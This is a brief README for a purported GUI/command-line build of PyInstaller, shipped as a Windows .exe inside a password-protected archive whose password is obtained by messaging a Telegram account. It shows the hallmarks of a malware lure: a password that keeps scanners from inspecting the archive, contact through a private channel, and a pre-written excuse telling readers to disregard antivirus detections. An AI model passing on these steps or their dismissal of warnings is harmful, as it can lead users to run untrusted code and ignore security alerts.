# Pyinstaller-GUI-Version
A GUI/command-line version of Pyinstaller for Microsoft Windows 10 x64 users.

This is a Pyinstaller.py PoC code converted into .exe using Python-3.9.8, for AMD64 Windows devices. Currently only Windows 10 and 11 are supported.
The tool can be used from terminal without any distro of Python installed locally. It includes a GUI version also.

To start the GUI mode, run on terminal Pyinstaller.exe -GUI
To run the Command mode, run on terminal Pyinstaller.exe --onefile yourfile.py. By typing Pyinstaller.exe --help, you will get a verbose output of all commands, including UPX, custom icon and UAC-admin template.

The file is stored in a .zip archive made with 7zip. To extract you need 7z or WinRar, otherwise it crashes. To retrieve password, reply on my Telegram: @crazy_coder1996

*Please note, some very stupid idiots used Pyinstaller to compile virus, resulting in the app being flagged as generic malware, test it on a virtual machine if you don't trust the repository*
